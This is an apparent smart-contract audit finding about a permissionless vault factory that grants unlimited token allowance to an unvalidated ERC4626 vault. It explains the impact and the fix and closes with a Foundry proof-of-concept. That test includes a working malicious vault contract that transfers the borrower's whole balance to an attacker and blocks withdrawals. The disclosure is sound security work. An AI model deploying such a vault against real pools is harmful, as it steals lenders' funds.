### Title

Unvalidated ERC4626 vault receives unlimited allowance and can drain all programmable-borrower funds - (File: `contracts/IdleCreditVaultFactory.sol`)

### Summary

`deployRevolvingCreditVault` is externally callable and accepts an arbitrary `ProgrammableBorrowerParams.vault` address. [1](#0-0)  The deployed `ProgrammableBorrower` validates only that `vault.asset()` equals the CDO underlying, then grants the supplied contract unlimited underlying-token allowance. [2](#0-1)  At the next `startEpoch`, pooled lender funds are sent to the programmable borrower and immediately passed into attacker-controlled `vault.deposit`, allowing the vault to transfer the full balance to itself or another address. [3](#0-2) [4](#0-3) 

### Finding Description

The external report’s bug class is trusted execution of an unvalidated remote object. The closest analog is the factory accepting an unvalidated ERC4626 address and `ProgrammableBorrower` subsequently executing that contract with privileged token approval. [5](#0-4) [6](#0-5) 

The deployment flow has no caller allowlist, implementation registry, or vault registry in `deployRevolvingCreditVault`. [7](#0-6)  `ProgrammableBorrower.initialize` performs only address and asset-identity checks before calling `_allowUnlimitedSpend(_underlyingToken, _vault)`. [8](#0-7) 

During `onStartEpoch`, the borrower takes its complete underlying balance and calls `_depositToVault`. [4](#0-3)  `_depositToVault` makes an external `vault.deposit(_assetAmount, address(this))` call, so attacker-supplied code executes while `msg.sender` is the funded programmable borrower. [6](#0-5)  Because the malicious vault is already an unlimited spender, it can execute `underlying.transferFrom(programmableBorrower, attacker, amount)` and return normally, or simply retain the deposited principal while minting unusable shares. [9](#0-8) 

The same trust boundary remains during repayments, because active-epoch repayments are redeployed through `_depositToVault`, exposing both initial pool principal and returned borrower funds to the malicious code. [10](#0-9) 

### Impact Explanation

A malicious vault can steal the entire amount transferred into the programmable borrower at epoch start, quantified as the full active-pool principal subject to the deployment. [4](#0-3) [6](#0-5)  It can also steal active-epoch repayments routed back through the vault. [10](#0-9) 

After the theft, the vault can mint shares or report arbitrary `convertToAssets` values while returning no underlying on withdrawal, leaving tranche holders without recoverable backing. [11](#0-10)  `onStopEpoch` either reverts on vault withdrawal failure or returns through the default path when the vault shares do not cover the requested shortfall, producing insolvency and freezing normal epoch settlement. [12](#0-11) [13](#0-12) 

### Likelihood Explanation

The attacker needs only an EOA capable of calling the permissionless factory and deploying a contract whose `asset()` returns the selected underlying. [14](#0-13) [15](#0-14)  No malicious owner, manager, guardian, borrower, Keyring administrator, fee receiver, queue, or privileged approval is required. [16](#0-15) [17](#0-16) 

The practical precondition is that lenders deposit into the resulting factory-deployed pool. After a deposit, the ordinary honest-manager `startEpoch` call is sufficient to trigger the theft, so the attacker does not need to sequence around special epoch states or manipulate privileged callers. [18](#0-17) [3](#0-2) 

### Recommendation

Do not accept arbitrary ERC4626 vaults or arbitrary implementation contracts in the permissionless factory. [7](#0-6)  Restrict `deployRevolvingCreditVault` to governance-approved deployers or maintain an immutable whitelist/registry of audited vault and implementation addresses selected by the honest treasury. [19](#0-18) 

Avoid standing unlimited allowances to externally configured vaults; approve only the intended deposit amount immediately before a trusted call. [9](#0-8)  Exact approvals reduce residual exposure but do not make an untrusted vault safe, because a malicious `deposit` can still retain the transferred principal, so component validation is the primary fix. [6](#0-5) 

### Proof of Concept

The following focused test can be added to `test/foundry/IdleCreditVaultFactory.t.sol` and run on a configured fork. It reuses the existing factory deployment helpers and the production `depositAA`/`startEpoch` path already exercised by the suite. [20](#0-19) [21](#0-20) 

```solidity
contract MaliciousERC4626Vault is ERC20 {
    IERC20 public immutable underlying;
    address public immutable sink;

    constructor(address underlying_, address sink_) ERC20("evil share", "evil") {
        underlying = IERC20(underlying_);
        sink = sink_;
    }

    function asset() external view returns (address) {
        return address(underlying);
    }

    function deposit(uint256 assets, address receiver) external returns (uint256) {
        uint256 steal = underlying.balanceOf(msg.sender);
        underlying.transferFrom(msg.sender, sink, steal);
        _mint(receiver, assets);
        return assets;
    }

    function convertToAssets(uint256 shares) external pure returns (uint256) {
        return shares;
    }

    function withdraw(uint256, address, address) external pure returns (uint256) {
        revert("no liquidity");
    }

    function redeem(uint256, address, address) external pure returns (uint256) {
        revert("no liquidity");
    }
}

function testMaliciousProgrammableVaultDrainsEpochPrincipal() external {
    vm.warp(100 days);

    address attacker = makeAddr("attacker");
    MockFactoryERC20 underlying =
        new MockFactoryERC20("Fork USDC", "fUSDC", 6);
    MaliciousERC4626Vault maliciousVault =
        new MaliciousERC4626Vault(address(underlying), attacker);

    IdleCreditVaultFactory factory = _deployFactory();
    (address cvProxy,, address programmableBorrower) =
        _deployRevolvingCreditVault(factory, underlying, maliciousVault);

    uint256 amount = 10_000e6;
    address lender = makeAddr("lender");
    underlying.mint(lender, amount);

    vm.startPrank(lender);
    underlying.approve(cvProxy, amount);
    IdleCDOEpochVariant(cvProxy).depositAA(amount);
    vm.stopPrank();

    vm.prank(manager);
    IdleCDOEpochVariant(cvProxy).startEpoch();

    assertEq(underlying.balanceOf(attacker), amount);
    assertEq(underlying.balanceOf(programmableBorrower), 0);
    assertEq(maliciousVault.balanceOf(programmableBorrower), amount);
}
```
